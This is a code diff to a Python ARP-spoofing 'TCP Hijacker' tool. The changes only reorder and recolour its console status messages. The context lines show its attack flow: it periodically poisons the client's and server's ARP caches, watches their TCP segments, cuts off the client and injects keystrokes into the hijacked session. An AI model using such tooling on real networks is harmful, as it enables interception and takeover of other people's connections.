@@ -80,7 +80,7 @@ def print_seg(tcp_seg):
     seg_str = f'\r{tcp_seg.src_port}->{tcp_seg.dst_port} '
     seg_str += f'seq {tcp_seg.seq_nr} ack {tcp_seg.ack_nr} '
     seg_str += f'len {tcp_seg.length} flags {tcp_seg.get_flag_str():<30}'
-    tools.print_rgb(seg_str, (100, 150, 100), bold=False)
+    tools.print_rgb(seg_str, (100, 150, 100), bold=False, end='')
 
 # validate parameters and initialize variables
 check_args()
@@ -103,16 +103,6 @@ if my_ip is None:
 my_mac = tools.get_mac_addr(if_name)
 client_mac = get_mac_addr(client_ip, if_name)
 server_mac = get_mac_addr(server_ip, if_name)
-
-# print some information
-tools.print_rgb('-- TCP Hijacker --',
-        rgb=(200, 150, 100), bold=True)
-tools.print_rgb(f'interface: {if_name} [{my_ip} ({my_mac})]',
-        rgb=(200, 200, 200), bold=False)
-tools.print_rgb(f'client: {client_ip}',
-        rgb=(200, 200, 200), bold=False)
-tools.print_rgb(f'server: {server_ip}:{server_port}',
-        rgb=(200, 200, 200), bold=False)
 
 arp_data_client = {'operation': 2,
         'src_addr': my_mac,
@@ -140,10 +130,21 @@ term_attr = termios.tcgetattr(sys.stdin)
 try:
     tty.setcbreak(sys.stdin.fileno())
     new_tty_attr = termios.tcgetattr(sys.stdin)
-    tools.print_rgb(f'poisoning ARP caches every {interval//10**9} s',
-            rgb=(100, 100, 100), bold=False)
+    # print some information
+    tools.print_rgb('-- TCP Hijacker --',
+            rgb=(200, 150, 100), bold=True)
     tools.print_rgb('> press H to hijack the session; ^D to exit <',
             rgb=(100, 100, 100), bold=True)
+    tools.print_rgb(f'poisoning ARP caches every {interval//10**9} s',
+            rgb=(200, 200, 200), bold=False)
+    tools.print_rgb(f'interface: {if_name} [{my_ip} ({my_mac})]',
+            rgb=(200, 200, 200), bold=False)
+    tools.print_rgb(f'server: {server_ip} ({server_mac})',
+            rgb=(200, 200, 200), bold=False)
+    tools.print_rgb(f'client: {client_ip} ({client_mac})',
+            rgb=(200, 200, 200), bold=False)
+    tools.print_rgb(f'server port: {server_port}',
+            rgb=(200, 200, 200), bold=False)
     while ord(ch) != 4: # 4 => ^D
         if time.time_ns() >= ctime + interval or ctime == 0:
             arp_msg_server.send(eth_handler.socket)
@@ -175,7 +176,7 @@ try:
                     if all(hijack_filter):
                         if client_port == 0:
                             tools.print_rgb(f'client port: {tcp_seg.src_port}',
-                                    rgb=(100, 100, 100), bold=False)
+                                    rgb=(200, 200, 200), bold=False)
                         print_seg(tcp_seg)
                         client_port = tcp_seg.src_port
                         seq_nr = tcp_seg.seq_nr
@@ -193,13 +194,13 @@ try:
                     try:
                         tcp_handler.send(ch.encode())
                     except errors.NoTCPConnectionException as e:
-                        tools.print_rgb('TCP session not established; Abort!',
+                        tools.print_rgb('\nTCP session not established; Abort!',
                                 rgb=(200, 100, 100), bold=True)
                         hijacked = False
                         break
             else:
                 if ch in ('h', 'H'):
-                    tools.print_rgb('Cutting off original client...',
+                    tools.print_rgb('\nCutting off original client...',
                             rgb=(200, 150, 100), bold=True, end='')
                     cut_off_client(if_name, client_ip, server_ip, client_port,
                             server_port, seq_nr, ack_nr)
@@ -251,4 +252,4 @@ finally:
         arp_msg_client.send(eth_handler.socket)
         time.sleep(0.1)
     tools.print_rgb('Done. Bye!',
-            rgb=(200, 0, 0), bold=True)
+            rgb=(200, 150, 100), bold=True)
